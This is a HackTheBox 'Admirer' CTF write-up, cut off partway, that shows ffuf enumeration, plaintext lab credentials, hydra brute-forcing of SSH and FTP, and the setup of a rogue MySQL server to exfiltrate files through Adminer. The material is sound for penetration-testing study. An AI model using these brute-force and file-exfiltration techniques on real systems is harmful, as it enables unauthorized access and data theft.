<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Admirer" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a web enumeration, discovering /admin-dir, containing credentials for FTP, FTP contains an archive of the web directory, revealing a directory utility-scripts that we did not discover earlier." /><meta property="og:description" content="Overview This machine begins w/ a web enumeration, discovering /admin-dir, containing credentials for FTP, FTP contains an archive of the web directory, revealing a directory utility-scripts that we did not discover earlier." /><link rel="canonical" href="https://yufongg.github.io/posts/Admirer/" /><meta property="og:url" content="https://yufongg.github.io/posts/Admirer/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-28T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Admirer" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-28T00:00:00+08:00","description":"Overview This machine begins w/ a web enumeration, discovering /admin-dir, containing credentials for FTP, FTP contains an archive of the web directory, revealing a directory utility-scripts that we did not discover earlier.","headline":"HackTheBox - Admirer","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Admirer/"},"url":"https://yufongg.github.io/posts/Admirer/"}</script><title>HackTheBox - Admirer | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Admirer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220927173804.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Admirer</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1664294400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-28 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2135 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, discovering <code class="language-plaintext highlighter-rouge">/admin-dir</code>, containing credentials for <code class="language-plaintext highlighter-rouge">FTP</code>, <code class="language-plaintext highlighter-rouge">FTP</code> contains an archive of the web directory, revealing a directory <code class="language-plaintext highlighter-rouge">utility-scripts</code> that we did not discover earlier.</p><p>Directory enumerating <code class="language-plaintext highlighter-rouge">utility-scripts</code> directory, discovered <code class="language-plaintext highlighter-rouge">adminer.php</code>, <code class="language-plaintext highlighter-rouge">adminer.php</code> is susceptible to a file exfiltration vulnerability, allowing us to exfiltrate <code class="language-plaintext highlighter-rouge">index.php</code> containing MySQL credentials, allowing us to SSH as user <code class="language-plaintext highlighter-rouge">waldo</code>.</p><p>User <code class="language-plaintext highlighter-rouge">waldo</code> has a sudoers entry that allows <code class="language-plaintext highlighter-rouge">waldo</code> to use <code class="language-plaintext highlighter-rouge">SETENV</code> and run <code class="language-plaintext highlighter-rouge">admin_task.sh</code> as root. <code class="language-plaintext highlighter-rouge">admin_task.sh</code> is susceptible to a Python PATH Hijacking exploit, due to calling a python script (<code class="language-plaintext highlighter-rouge">backup.py</code>). <code class="language-plaintext highlighter-rouge">backup.py</code> is importing a library called <code class="language-plaintext highlighter-rouge">shutil.py</code>.</p><p>We are able to do Python PATH Hijacking by setting python path environment to <code class="language-plaintext highlighter-rouge">/tmp</code> where our malicious python script <code class="language-plaintext highlighter-rouge">shutil.py</code> resides, when <code class="language-plaintext highlighter-rouge">admin_task.sh</code> is executed, our malicious python library is called instead of the legitimate library, invoking a reverse shell, privilege escalating us to <code class="language-plaintext highlighter-rouge">root</code>.</p><p>If you wish to practice machines that are similar to this try:</p><ul><li>TryHackMe Wonderland<li>TryHackMe Linux Agency<li>TryHackMe HackerOne Easy<li>HackTheBox FriendZone</ul><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Admirer<tr><td>IP<td>10.10.10.187<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/159204">polarbearer</a>Â &amp;Â <a href="https://www.hackthebox.com/home/users/profile/125033">GibParadox</a><tr><td>Release Date<td>02 May 2020</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  images                  <span class="o">[</span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms]
  index.php               <span class="o">[</span>Status: 200, Size: 6051, Words: 385, Lines: 154, Duration: 37ms]
  robots.txt              <span class="o">[</span>Status: 200, Size: 138, Words: 21, Lines: 5, Duration: 35ms]
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">robots.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>  â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
  â””â”€# curl http://admirer.htb/robots.txt
  User-agent: *
	
  # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
  Disallow: /admin-dir
</pre></table></code></div></div></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---admin-dir-creds-found">TCP/80 (HTTP) - /admin-dir, creds found <a href="#tcp80-http---admin-dir-creds-found" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Directory enumerate <code class="language-plaintext highlighter-rouge">/admin-dir/FUZZ</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer]
 â””â”€# ffuf -u http://admirer.htb/admin-dir/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.txt,.html'
	
  :: Method           : GET
  :: URL              : http://admirer.htb/admin-dir/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  :: Extensions       : .txt .html
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 ________________________________________________
	
 contacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30, Duration: 40ms]
                         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms]
 .html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms]
 credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12, Duration: 37ms]
 :: Progress: [661638/661638] :: Job [1/1] :: 1101 req/sec :: Duration: [0:10:09] :: Erro
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">credentials.txt</code></ul><li>Obtain credentials<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
 â””â”€# curl -s http://admirer.htb/admin-dir/credentials.txt |  grep -vP "\[\S+" | sed -z 's/\n\n/\n/g' | tee creds.txt
 w.cooper@admirer.htb
 fgJr6q#S\W:$P
 ftpuser
 %n?4Wz}R$tTF7
 admin
 w0rdpr3ss01!
</pre></table></code></div></div></ol><h2 id="bruteforce-w-creds-found">Bruteforce w/ Creds found <a href="#bruteforce-w-creds-found" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Bruteforce SSH w/ <code class="language-plaintext highlighter-rouge">hydra</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
 â””â”€# hydra -L creds.txt -P creds.txt ssh://admirer.htb
 Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-27 18:14:00
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
 [DATA] attacking ssh://admirer.htb:22/
 [22][ssh] host: admirer.htb   login: ftpuser   password: %n?4Wz}R$tTF7
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">ftpuser:%n?4Wz}R$tTF7</code></ul><li>Bruteforce FTP w/ <code class="language-plaintext highlighter-rouge">hydra</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
 â””â”€# hydra -L creds.txt -P creds.txt ftp://admirer.htb
 Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 01:08:55
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
 [DATA] attacking ftp://admirer.htb:21/
 [21][ftp] host: admirer.htb   login: ftpuser   password: %n?4Wz}R$tTF7
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">ftpuser:%n?4Wz}R$tTF7</code></ul></ol><h2 id="tcp22-ssh----failed">TCP/22 (SSH) - Failed <a href="#tcp22-ssh----failed" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Failed to SSH, connection closes instantly<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html]
 â””â”€# sshpass -p '%n?4Wz}R$tTF7' ssh ftpuser@admirer.htb
 Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
	
 The programs included with the Devuan GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
	
 Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Tue Sep 27 19:05:38 2022 from 10.10.14.14
 Connection to admirer.htb closed.
</pre></table></code></div></div></ol><h2 id="tcp21-ftp---analyzing-the-files-in-ftp">TCP/21 (FTP) - Analyzing the files in FTP <a href="#tcp21-ftp---analyzing-the-files-in-ftp" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Download all files in <code class="language-plaintext highlighter-rouge">FTP</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
 â””â”€# wget --no-passive -q -m --ftp-user="ftpuser" --ftp-password='%n?4Wz}R$tTF7' ftp://10.10.10.187:21
</pre></table></code></div></div><li>View directory structure of <code class="language-plaintext highlighter-rouge">FTP</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot]
 â””â”€# tree -a 10.10.10.187/
 10.10.10.187/
 â”œâ”€â”€ dump.sql
 â”œâ”€â”€ html.tar.gz
 â””â”€â”€ .listing
	
 0 directories, 3 files
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">dump.sql</code> does not contain any interesting information</p></div></blockquote><li>View directory structure of <code class="language-plaintext highlighter-rouge">html</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html]
 â””â”€# tree -d
 .
 â”œâ”€â”€ assets
 â”‚Â Â  â”œâ”€â”€ css
 â”‚Â Â  â”‚Â Â  â””â”€â”€ images
 â”‚Â Â  â”œâ”€â”€ js
 â”‚Â Â  â”œâ”€â”€ sass
 â”‚Â Â  â”‚Â Â  â”œâ”€â”€ base
 â”‚Â Â  â”‚Â Â  â”œâ”€â”€ components
 â”‚Â Â  â”‚Â Â  â”œâ”€â”€ layout
 â”‚Â Â  â”‚Â Â  â””â”€â”€ libs
 â”‚Â Â  â””â”€â”€ webfonts
 â”œâ”€â”€ images
 â”‚Â Â  â”œâ”€â”€ fulls
 â”‚Â Â  â””â”€â”€ thumbs
 â”œâ”€â”€ utility-scripts
 â””â”€â”€ w4ld0s_s3cr3t_d1r
	
 15 directories
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li><code class="language-plaintext highlighter-rouge">index.php</code> - Creds: <code class="language-plaintext highlighter-rouge">waldo:]F7jLHw:*G&gt;UPrTo}~A</code><li><code class="language-plaintext highlighter-rouge">assets</code> - contains <code class="language-plaintext highlighter-rouge">.css</code> &amp; <code class="language-plaintext highlighter-rouge">.js</code> files<li><code class="language-plaintext highlighter-rouge">images</code> - contains <code class="language-plaintext highlighter-rouge">.jpg</code> files<li><code class="language-plaintext highlighter-rouge">utility-scripts</code> - contains <code class="language-plaintext highlighter-rouge">.php</code> files w/ credentials<li><code class="language-plaintext highlighter-rouge">w4ld0s_s3cr3t_d1r</code> - same as <code class="language-plaintext highlighter-rouge">/admin-dir</code></ul></div></blockquote><li>View directory structure of <code class="language-plaintext highlighter-rouge">utility-scripts</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html]
 â””â”€# tree  utility-scripts
 utility-scripts
 â”œâ”€â”€ admin_tasks.php
 â”œâ”€â”€ db_admin.php
 â”œâ”€â”€ info.php
 â””â”€â”€ phptest.php
	
 0 directories, 4 files
</pre></table></code></div></div><blockquote class="prompt-info"><div><ul><li><code class="language-plaintext highlighter-rouge">admin_tasks.php</code> - not vulnerable to any SQLi<li><code class="language-plaintext highlighter-rouge">db_admin</code> - Creds: <code class="language-plaintext highlighter-rouge">waldo:Wh3r3_1s_w4ld0?</code><li><code class="language-plaintext highlighter-rouge">info.php</code> - not vulnerable<li><code class="language-plaintext highlighter-rouge">phptest.php</code> - not vulnerable</ul></div></blockquote><li>After obtaining more creds, <code class="language-plaintext highlighter-rouge">hydra</code> did not find any valid login.</ol><h2 id="tcp80-http---utility-scripts--found-adminer-database-management-tool">TCP/80 (HTTP) - /utility-scripts, Found Adminer database management tool <a href="#tcp80-http---utility-scripts--found-adminer-database-management-tool" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Directory <code class="language-plaintext highlighter-rouge">/utility-scripts</code> and the files residing in it exists, however, the <code class="language-plaintext highlighter-rouge">.php</code> files are not vulnerable.<li>Directory enumerate <code class="language-plaintext highlighter-rouge">/utility-scripts</code> against <code class="language-plaintext highlighter-rouge">big.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/admirer/10.10.10.187]
 â””â”€# ffuf -u http://admirer.htb/utility-scripts/FUZZ -w /usr/share/dirb/wordlists/big.txt -e '.txt,.php'
	
 info.php                [Status: 200, Size: 83860, Words: 4033, Lines: 962, Duration: 43ms]
 info.php                [Status: 200, Size: 83860, Words: 4033, Lines: 962, Duration: 48ms]
 adminer.php             [Status: 200, Size: 4295, Words: 189, Lines: 52, Duration: 107ms]
 :: Progress: [13848/13848] :: Job [1/1] :: 1075 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">adminer.php</code></ul><li>Found a login page @ <code class="language-plaintext highlighter-rouge">adminer.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928041707.png" alt="" data-proofer-ignore><li>I knew exactly what to do because I exploited the same vulnerability in Vulnhub ReadMe</ol><h2 id="tcp80-http---setup-mysql-on-kali">TCP/80 (HTTP) - Setup MySQL on Kali <a href="#tcp80-http---setup-mysql-on-kali" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Install MySQL<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/ReadMe]
 â””â”€# sudo apt-get install mariadb-server
</pre></table></code></div></div><li>Authenticate<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> mysql 
</pre></table></code></div></div><li>Create a user w/ all privileges on a database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> MariaDB [mysql]&gt; CREATE USER 'yf'@'%' IDENTIFIED WITH mysql_native_password;
 Query OK, 0 rows affected (0.001 sec)

 MariaDB [mysql]&gt; SET PASSWORD FOR 'yf'@'%' = PASSWORD('password');
 Query OK, 0 rows affected (0.001 sec)

 MariaDB [mysql]&gt; GRANT ALL PRIVILEGES ON *.* TO 'yf'@'%';
 Query OK, 0 rows affected (0.000 sec)
</pre></table></code></div></div><li>Enable <code class="language-plaintext highlighter-rouge">local_infile</code> on Kaliâ€™s MySQL Server<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> SET GLOBAL local_infile = true;
</pre></table></code></div></div><li>Verify that <code class="language-plaintext highlighter-rouge">local_infile</code> is enabled<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> SHOW GLOBAL VARIABLES LIKE 'local_infile';
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220218195517.png" alt="" data-proofer-ignore></p><li>Allow remote connections<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Changed from 127.0.0.1 -&gt; 0.0.0.0 
 nano /etc/mysql/mariadb.conf.d/50-server.cnf
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220218203016.png" alt="" data-proofer-ignore></p><li>Proceed to <code class="language-plaintext highlighter-rouge">adminer.php</code> &amp; login w/ <code class="language-plaintext highlighter-rouge">yf:password</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928042939.png" alt="" data-proofer-ignore></ol><h2 id="tcp80-http---adminer-data-exfiltration">TCP/80 (HTTP) - Adminer data exfiltration <a href="#tcp80-http---adminer-data-exfiltration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Create a table <code class="language-plaintext highlighter-rouge">exploit</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Admirer/images/Pasted%20image%2020220928043700.png" alt="" data-proofer-ignore><li>Proceed to <code class="language-plaintext highlighter-rouge">SQL Command</code>, populate the exploit table w/ data we want to exfiltrate<ul><li><code class="language-plaintext highlighter-rouge">/etc/passwd</code><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  <span class="o">#</span> <span class="n">MySQL</span> <span class="n">Query</span>
